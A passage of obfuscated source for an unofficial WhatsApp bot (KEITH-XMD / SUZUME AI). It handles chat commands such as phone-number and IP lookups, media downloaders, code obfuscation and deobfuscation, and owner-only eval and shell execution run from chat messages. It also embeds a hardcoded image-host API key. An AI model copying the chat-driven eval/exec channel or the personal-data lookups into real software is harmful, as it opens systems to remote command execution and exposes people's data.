            const _0x5a4845 = await axios.get("https://fam-official.serv00.net/sim/famwabomr.php?number=" + _0x11dcf2);
            let _0x297add = _0x5a4845.data.split("}{").map((_0x13879b, _0x5b73ed, _0x436492) => {
              if (_0x5b73ed === 0) {
                return _0x13879b + "}";
              } else if (_0x5b73ed === _0x436492.length - 1) {
                return "{" + _0x13879b;
              } else {
                return "{" + _0x13879b + "}";
              }
            });
            let _0x865a91 = _0x297add.map(_0x42c169 => JSON.parse(_0x42c169).message).join("\n");
            _0x4e7dbf(_0x865a91);
          } catch (_0x2580e1) {
            console.error("API Error:", _0x2580e1);
            _0x4e7dbf("⚠ Error fetching data. Try again later.");
          }
        }
        break;
      case "ai":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Hi Brother/sister!* 🤖\nCan I help you?\n_Type:_ *.ai Your Question*");
          }
          try {
            const _0x5ef68e = "https://iamtkm.vercel.app/ai/suzume?text=" + encodeURIComponent(_0x4d841c);
            const _0x387d41 = await axios.get(_0x5ef68e);
            console.log("API Response:", _0x387d41.data);
            if (_0x387d41.data && _0x387d41.data.success) {
              _0x4e7dbf("" + _0x387d41.data.message);
            } else {
              _0x4e7dbf("⚠ *Error:* " + (_0x387d41.data.message || "AI response not available."));
            }
          } catch (_0x5915f3) {
            console.error("AI API Error:", _0x5915f3);
            _0x4e7dbf("⚠ *Error fetching AI response.*\nPlease try again later.");
          }
        }
        break;
      case "getsc":
        {
          if (_0x3072e9.sender.split("@")[0] !== global.owner && _0x3072e9.sender !== _0x9d3ee5) {
            return _0x4e7dbf("⚠️ *Only the owner can use this command!*");
          }
          let _0x1fc323 = await fs.readdirSync("./session");
          if (_0x1fc323.length > 1) {
            let _0x29ddce = _0x1fc323.filter(_0x382ef6 => _0x382ef6 !== "creds.json");
            for (let _0x5c8cb9 of _0x29ddce) {
              await fs.unlinkSync("./session/" + _0x5c8cb9);
            }
          }
          await _0x4e7dbf("⏳ *Processing bot script backup... Please wait.*");
          var _0x532480 = "KEITH-XMD🚀";
          const _0x41163b = (await execSync("ls")).toString().split("\n").filter(_0x1647e7 => _0x1647e7 !== "node_modules" && _0x1647e7 !== "session" && _0x1647e7 !== "package-lock.json" && _0x1647e7 !== "yarn.lock" && _0x1647e7 !== "");
          await execSync("zip -r " + _0x532480 + ".zip " + _0x41163b.join(" "));
          await _0x4afd02.sendMessage(_0x3072e9.sender, {
            document: await fs.readFileSync("./" + _0x532480 + ".zip"),
            fileName: _0x532480 + ".zip",
            mimetype: "application/zip"
          }, {
            quoted: _0x3072e9
          });
          await execSync("rm -rf " + _0x532480 + ".zip");
          if (_0x3072e9.chat !== _0x3072e9.sender) {
            return _0x4e7dbf("📩 *The bot script has been sent to your private chat!*");
          }
        }
        break;
      case "trackip":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " 112.90.150.204");
          }
          try {
            let _0x21a4aa = await fetch("https://ipwho.is/" + _0x4d841c).then(_0x596a43 => _0x596a43.json());
            if (!_0x21a4aa || !_0x21a4aa.success) {
              throw new Error("⚠ IP " + _0x4d841c + " not found!");
            }
            const _0x46803a = _0x451e6a => {
              return "🎩 *KEITH-XMD🚀- 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑*\n\n" + ("📍 *IP Address:* " + (_0x451e6a.ip || "N/A") + "\n") + ("✅ *Success:* " + (_0x451e6a.success ? "Yes" : "No") + "\n") + ("🌍 *Type:* " + (_0x451e6a.type || "N/A") + "\n") + ("🗺️ *Continent:* " + (_0x451e6a.continent || "N/A") + " (" + (_0x451e6a.continent_code || "N/A") + ")\n") + ("🏳️ *Country:* " + (_0x451e6a.country || "N/A") + " (" + (_0x451e6a.country_code || "N/A") + ")\n") + ("🏙️ *Region:* " + (_0x451e6a.region || "N/A") + " (" + (_0x451e6a.region_code || "N/A") + ")\n") + ("🌆 *City:* " + (_0x451e6a.city || "N/A") + "\n") + ("📌 *Latitude:* " + (_0x451e6a.latitude || "N/A") + "\n") + ("📌 *Longitude:* " + (_0x451e6a.longitude || "N/A") + "\n") + ("🌐 *Is EU:* " + (_0x451e6a.is_eu ? "Yes" : "No") + "\n") + ("📮 *Postal Code:* " + (_0x451e6a.postal || "N/A") + "\n") + ("📞 *Calling Code:* +" + (_0x451e6a.calling_code || "N/A") + "\n") + ("🏛️ *Capital:* " + (_0x451e6a.capital || "N/A") + "\n") + ("🗺️ *Borders:* " + (Array.isArray(_0x451e6a.borders) && _0x451e6a.borders.length > 0 ? _0x451e6a.borders.join(", ") : "None") + "\n\n") + "🚀 *Connection Details:*\n" + ("🔹 *ASN:* " + (_0x451e6a.connection?.asn || "N/A") + "\n") + ("🏢 *Organization:* " + (_0x451e6a.connection?.org || "N/A") + "\n") + ("📡 *ISP:* " + (_0x451e6a.connection?.isp || "N/A") + "\n") + ("🌎 *Domain:* " + (_0x451e6a.connection?.domain || "N/A") + "\n\n") + ("⏰ *Timezone:* " + (_0x451e6a.timezone?.id || "N/A") + " (" + (_0x451e6a.timezone?.abbr || "N/A") + ")\n") + ("🕒 *Current Time:* " + (_0x451e6a.timezone?.current_time || "N/A") + "\n\n") + "🚀 *KEITH-XMD🚀*";
            };
            if (_0x21a4aa.latitude && _0x21a4aa.longitude) {
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                location: {
                  degreesLatitude: _0x21a4aa.latitude,
                  degreesLongitude: _0x21a4aa.longitude
                }
              });
            }
            const _0x5ac071 = _0x1da830 => new Promise(_0x5419ab => setTimeout(_0x5419ab, _0x1da830));
            await _0x5ac071(2000);
            _0x4e7dbf(_0x46803a(_0x21a4aa));
          } catch (_0x7e3dba) {
            console.error("Error in 'trackip' case:", _0x7e3dba);
            _0x4e7dbf("⚠ *Error:* Unable to retrieve data for IP " + _0x4d841c);
          }
        }
        break;
      case "addprem":
        if (!_0x2616e7(_0x5c56de)) {
          return _0x4e7dbf(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+50938025349 ");
        }
        if (!_0xf66042[0]) {
          return _0x4e7dbf("Use " + (_0x2c0185 + _0x17343c) + " number\nContoh " + (_0x2c0185 + _0x17343c) + " 1849xxx");
        }
        prrkek = _0x40c906.split("|")[0].replace(/[^0-9]/g, "");
        let _0x11d166 = await _0x4afd02.onWhatsApp(prrkek);
        if (_0x11d166.length == 0) {
          return _0x4e7dbf("Enter a valid and registered number on WhatsApp!!!");
        }
        _0x547f63.push(prrkek);
        fs.writeFileSync("./database/premium.json", JSON.stringify(_0x547f63));
        _0x4e7dbf("oke تک رسائی دی گئی ہے۔ bot");
        break;
      case "delprem":
        if (!_0x2616e7(_0x5c56de)) {
          return _0x4e7dbf(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+263771639199 ");
        }
        if (!_0xf66042[0]) {
          return _0x4e7dbf("Use " + (_0x2c0185 + _0x17343c) + " Nomor\nContoh " + (_0x2c0185 + _0x17343c) + " 1849xxx");
        }
        ya = _0x40c906.split("|")[0].replace(/[^0-9]/g, "");
        unp = _0x547f63.indexOf(ya);
        _0x547f63.splice(unp, 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(_0x547f63));
        _0x4e7dbf("yah اب رسائی نہیں ہے");
        break;
      case "clearchat":
        if (!_0x2616e7(_0x5c56de)) {
          return _0x4e7dbf("❌ Only the Owner can use this command!");
        }
        for (let _0x109b81 = 0; _0x109b81 < 2; _0x109b81++) {
          if (!_0x40c906) {
            return _0x4e7dbf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
          }
          await _0x4afd02.sendMessage(_0x59eeb8, {
            text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
          });
        }
        break;
      case "tt":
      case "tiktok":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <tiktok_url>\nExample: " + (_0x2c0185 + _0x17343c) + " https://www.tiktok.com/@username/video/123456789\n\n🔥 *Powered by KEITH-XMD🚀*");
          }
          const _0x410cec = _0x4d841c.trim();
          if (!_0x54ede9(_0x410cec) || !_0x410cec.includes("tiktok.com")) {
            return _0x4e7dbf("❌ *Invalid URL!* Please provide a valid TikTok video URL (e.g., https://www.tiktok.com/@username/video/123456789).");
          }
          try {
            await _0x2bc3b1();
            const _0x5d66c7 = "https://rest-lily.vercel.app/api/downloader/tiktok?url=" + encodeURIComponent(_0x410cec);
            const _0x2088b8 = await axios.get(_0x5d66c7, {
              headers: {
                Accept: "*/*"
              }
            });
            const _0xafdbd0 = _0x2088b8.data;
            if (_0xafdbd0.status === true && _0xafdbd0.data) {
              const {
                no_watermark: _0x4d8e81,
                music: _0x4ccd5c,
                title: _0x2df929,
                creator: _0x8664a
              } = _0xafdbd0.data;
              if (!_0x4d8e81 || !_0x4ccd5c) {
                return _0x4e7dbf("❌ *Error:* No downloadable media found in the provided URL.\nEnsure the video is public and try again.");
              }
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                video: {
                  url: _0x4d8e81
                },
                caption: "🎥 TikTok Video\n\n🔥 Powered by SUZUME AI🚀"
              }, {
                quoted: _0x3072e9
              });
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                audio: {
                  url: _0x4ccd5c
                },
                mimetype: "audio/mpeg",
                ptt: false,
                caption: "🎵 *TikTok Music MP3*\n\n📝 *Title:* " + (_0x2df929 || "No title") + "\n👤 *Creator:* " + (_0x8664a || "Unknown") + "\n\n🔥 *Powered by SUZUME AI*",
                contextInfo: {
                  mentionedJid: [_0x3072e9.sender],
                  forwardedNewsletterMessageInfo: {
                    newsletterName: "SUZUME AI🚀",
                    newsletterJid: "120363401903613460@newsletter"
                  },
                  isForwarded: true,
                  externalAdReply: {
                    title: "SUZUME AI🚀",
                    thumbnailUrl: "https://i.ibb.co/VpPWWL5q/fam-ofc.jpg",
                    sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
                  }
                }
              }, {
                quoted: _0x3072e9
              });
            } else {
              await _0x4e7dbf("❌ *Failed to fetch TikTok media:* " + (_0xafdbd0.message || "No media found in the provided URL.") + "\nPlease check the URL and ensure the video is public.");
            }
          } catch (_0x5d694c) {
            console.error("TikTok Downloader Error:", _0x5d694c);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "❌ *Error:* " + (_0x5d694c.message || "Unable to download TikTok media. Try again later.")
            }, {
              quoted: _0x3072e9
            });
          }
        }
        break;
      case "enc":
        {
          const _0xa0ce0e = "Usage Example:\n" + (_0x2c0185 + _0x17343c) + " doc (Reply to a document)";
          let _0x394958;
          if (_0xf66042.length >= 1) {
            _0x394958 = _0xf66042.join(" ");
          } else if (_0x3072e9.quoted && _0x3072e9.quoted.text) {
            _0x394958 = _0x3072e9.quoted.text;
          } else {
            return _0x4e7dbf(_0xa0ce0e);
          }
          try {
            let _0x3701dd;
            if (_0x394958 === "doc" && _0x3072e9.quoted && _0x3072e9.quoted.mtype === "extendedTextMessage") {
              let _0x4c3e48;
              if (_0x3072e9.quoted.mimetype) {
                _0x4c3e48 = await _0x3072e9.quoted.download();
              }
              _0x3701dd = _0x4c3e48.toString("utf-8");
            } else {
              _0x3701dd = _0x394958;
            }
            const _0x10cc96 = {
              target: "node",
              preset: "high",
              compact: true,
              minify: true,
              flatten: true,
              identifierGenerator: function () {
                const _0x11a19d = "素晴座素晴難 🚀🚀🚀 SUZUME AI🚀🚀素晴座素晴難素晴座素晴 🚀🚀🚀SUZUME AI🚀🚀🚀素晴座素晴難";
                function _0x4b30b5(_0x4d1ebe) {
                  return _0x4d1ebe.replace(/[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, "");
                }
                function _0x4b09f6(_0x30fb7b) {
                  let _0x7b0a0a = "";
                  const _0x42def4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                  const _0x3cf2f3 = _0x42def4.length;
                  for (let _0x56681c = 0; _0x56681c < _0x30fb7b; _0x56681c++) {
                    _0x7b0a0a += _0x42def4.charAt(Math.floor(Math.random() * _0x3cf2f3));
                  }
                  return _0x7b0a0a;
                }
                return _0x4b30b5(_0x11a19d) + _0x4b09f6(2);
              },
              renameVariables: true,
              renameGlobals: true,
              stringEncoding: true,
              stringSplitting: 0,
              stringConcealing: true,
              stringCompression: true,
              duplicateLiteralsRemoval: 1,
              shuffle: {
                hash: 0,
                true: 0
              },
              stack: true,
              controlFlowFlattening: 1,
              opaquePredicates: 0.9,
              deadCode: 0,
              dispatcher: true,
              rgf: false,
              calculator: true,
              hexadecimalNumbers: true,
              movedDeclarations: true,
              objectExtraction: true,
              globalConcealing: true
            };
            const _0x1f5a0e = {
              target: "node",
              calculator: true,
              compact: true,
              hexadecimalNumbers: true,
              controlFlowFlattening: 0.5,
              deadCode: 0.25,
              dispatcher: true,
              duplicateLiteralsRemoval: 0.75,
              flatten: true,
              globalConcealing: true,
              minify: true,
              movedDeclarations: true,
              objectExtraction: true,
              opaquePredicates: 0.75,
              renameVariables: true,
              renameGlobals: true,
              shuffle: true,
              stringConcealing: true,
              stringCompression: true,
              stringEncoding: true,
              stringSplitting: 0.75,
              preserveFunctionLength: true,
              identifierGenerator: function () {
                return "Ntando_Ofc" + Math.random().toString(36).substring(7);
              }
            };
            const _0x3a95a9 = await JSConfuser.obfuscate(_0x3701dd, _0x10cc96);
            const _0x3d1222 = "./enc_by_suzumeai.js";
            fs.writeFileSync(_0x3d1222, _0x3a95a9);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              document: {
                url: _0x3d1222
              },
              mimetype: "application/javascript",
              fileName: "Encrypted By suzumeai.js"
            }, {
              quoted: _0x3072e9
            });
          } catch (_0x18e85a) {
            const _0x40833a = "There is an error: " + _0x18e85a.message;
            await _0x4e7dbf(_0x40833a);
          }
        }
        break;
      case "dec":
      case "decrypt":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          const {
            webcrack: _0x2c434a
          } = await import("webcrack");
          const _0x50aa72 = "📌 *Usage Example:*\n" + ("- *" + (_0x2c0185 + _0x17343c) + "* (Input text or reply to encrypted text)\n") + ("- *" + (_0x2c0185 + _0x17343c) + " doc* (Reply to an encrypted document)");
          let _0xb8964a;
          if (_0xf66042.length >= 1) {
            _0xb8964a = _0xf66042.join(" ");
          } else if (_0x3072e9.quoted && _0x3072e9.quoted.text) {
            _0xb8964a = _0x3072e9.quoted.text;
          } else {
            return _0x4e7dbf(_0x50aa72);
          }
          try {
            let _0xf53467;
            let _0x3cc8a6 = "./dec_by_suzumeai.js";
            if (_0xb8964a === "doc" && _0x3072e9.quoted && _0x3072e9.quoted.mtype === "documentMessage") {
              let _0x2ebde3;
              if (_0x3072e9.quoted.mimetype) {
                _0x2ebde3 = await _0x3072e9.quoted.download();
              }
              _0xf53467 = await _0x2c434a(_0x2ebde3.toString("utf-8"));
            } else {
              _0xf53467 = await _0x2c434a(_0xb8964a);
            }
            fs.writeFileSync(_0x3cc8a6, _0xf53467.code);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              document: fs.readFileSync(_0x3cc8a6),
              mimetype: "application/javascript",
              fileName: "Decrypted_By_suzumeai.js"
            }, {
              quoted: _0x3072e9
            });
            fs.unlinkSync(_0x3cc8a6);
          } catch (_0x3638a0) {
            _0x4e7dbf("⚠ *Error Decrypting:* " + _0x3638a0.message);
          }
        }
        break;
      case "splay":
        {
          const _0x3513ac = require("axios");
          if (!_0x4d841c) {
            return _0x4e7dbf("song name lekho");
          }
          await _0x4e7dbf("loading");
          try {
            const _0x5eafce = "https://spotifyapi.caliphdev.com/api/search/tracks?q=" + encodeURIComponent(_0x4d841c);
            const _0x2d5595 = (await _0x3513ac.get(_0x5eafce)).data;
            const _0x1ece74 = _0x2d5595[0];
            if (!_0x1ece74) {
              return _0x4e7dbf("Lagu tidak ditemukan.");
            }
            const _0x2a3928 = "*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*\n\n- *Judul:* " + _0x1ece74.title + "\n- *Artis:* " + _0x1ece74.artist + "\n- *URL:* " + _0x1ece74.url;
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "" + _0x2a3928,
              contextInfo: {
                mentionedJid: [_0x3072e9.sender],
                externalAdReply: {
                  showAdAttribution: true,
                  title: "" + _0x1ece74.title,
                  body: "SPOTIFY SEARCH & DOWNLOAD",
                  thumbnailUrl: _0x1ece74.thumbnail,
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }, {
              quoted: _0x3072e9
            });
            const _0x456734 = "https://spotifyapi.caliphdev.com/api/download/track?url=" + encodeURIComponent(_0x1ece74.url);
            let _0x5eafd7 = await fetch(_0x456734);
            if (_0x5eafd7.headers.get("content-type") === "audio/mpeg") {
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                audio: {
                  url: _0x456734
                },
                mimetype: "audio/mpeg"
              }, {
                quoted: _0x3072e9
              });
            } else {
              _0x4e7dbf("Gagal mendapatkan file audio.");
            }
          } catch (_0x130591) {
            console.error(_0x130591);
            _0x4e7dbf("Terjadi kesalahan saat mengambil file audio.");
          }
        }
        break;
      case "tourl":
        {
          const _0x22e984 = require("axios");
          const _0x46cfbc = require("form-data");
          const _0x1739e3 = require("fs");
          if (!_0x3072e9.quoted || !_0x3072e9.quoted.mimetype || !_0x3072e9.quoted.mimetype.startsWith("image/")) {
            return _0x4e7dbf("📌 براہ کرم کسی تصویر پر ریپلائے کریں تاکہ اسے لنک میں تبدیل کیا جا سکے!");
          }
          let _0x22badf = await _0x3072e9.quoted.download();
          let _0x590183 = "./suzumeai.jpg";
          _0x1739e3.writeFileSync(_0x590183, _0x22badf);
          let _0x555270 = new _0x46cfbc();
          _0x555270.append("image", _0x1739e3.createReadStream(_0x590183));
          try {
            let _0x14a433 = await _0x22e984.post("https://api.imgbb.com/1/upload?key=1fe5c36a643f15d1e5478c716f876a4c", _0x555270, {
              headers: {
                ..._0x555270.getHeaders()
              }
            });
            _0x1739e3.unlinkSync(_0x590183);
            let _0x2557b6 = _0x14a433.data;
            if (_0x2557b6.success) {
              let _0x4bf038 = _0x2557b6.data.url;
              _0x4e7dbf("✅ **Image Uploaded Successfully!**\n🔗 **URL:** " + _0x4bf038);
            } else {
              _0x4e7dbf("⚠ تصویر کو لنک میں تبدیل کرنے میں خرابی ہوئی، دوبارہ کوشش کریں!");
            }
          } catch (_0x343f76) {
            console.error("API Error:", _0x343f76);
            _0x4e7dbf("⚠ API سے کنکشن ناکام ہوگیا، دوبارہ کوشش کریں!");
          }
        }
        break;
      default:
        if (_0x5768f3.startsWith("=>")) {
          if (!_0x2616e7(_0x5c56de)) {
            return;
          }
          function _0x5e5766(_0x3fa763) {
            sat = JSON.stringify(_0x3fa763, null, 2);
            bang = util.format(sat);
            if (sat == _0x4afd02) {
              bang = util.format(_0x3fa763);
            }
            return _0x4e7dbf(bang);
          }
          try {
            _0x4e7dbf(util.format(eval("(async () => { return " + _0x5768f3.slice(3) + " })()")));
          } catch (_0x2ab177) {
            _0x4e7dbf(String(_0x2ab177));
          }
        }
        if (_0x5768f3.startsWith(">")) {
          if (!_0x2616e7(_0x5c56de)) {
            return;
          }
          let _0x4ce78f = _0x5768f3.trim().split(/ +/)[0];
          let _0x522095;
          try {
            _0x522095 = await eval("(async () => { " + (_0x4ce78f == ">>" ? "return" : "") + " " + _0x40c906 + "})()");
          } catch (_0x139057) {
            _0x522095 = _0x139057;
          } finally {
            await _0x4e7dbf(require("util").format(_0x522095));
          }
        }
        if (_0x5768f3.startsWith("$")) {
          if (!_0x2616e7(_0x5c56de)) {
            return;
          }
          exec(_0x5768f3.slice(2), (_0x2cf9cd, _0x2eb47d) => {
            if (_0x2cf9cd) {
              return _0x4e7dbf("" + _0x2cf9cd);
            }
            if (_0x2eb47d) {
              return _0x4e7dbf(_0x2eb47d);
            }
          });
        }
    }
  } catch (_0x458a8f) {
    console.log(util.format(_0x458a8f));
  }
};
const getAIResponse = async (_0x16baa0, _0x11d3e8) => {
  try {
    const _0x3d4eaf = "https://iamtkm.vercel.app/ai/tkm?text=" + encodeURIComponent(_0x16baa0);
    const _0x5c7db8 = await axios.get(_0x3d4eaf);
    console.log("AI API Response:", _0x5c7db8.data);
    if (_0x5c7db8.data && _0x5c7db8.data.success) {
      return _0x11d3e8.reply("" + _0x5c7db8.data.message);
    } else {
      return _0x11d3e8.reply("⚠ *Error:* " + (_0x5c7db8.data.message || "AI response not available."));
    }
  } catch (_0x594297) {
    console.error("AI API Error:", _0x594297);
    return _0x11d3e8.reply("⚠ *Error fetching AI response.*\nPlease try again later.");
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("Update " + __filename);
  delete require.cache[file];
  require(file);
});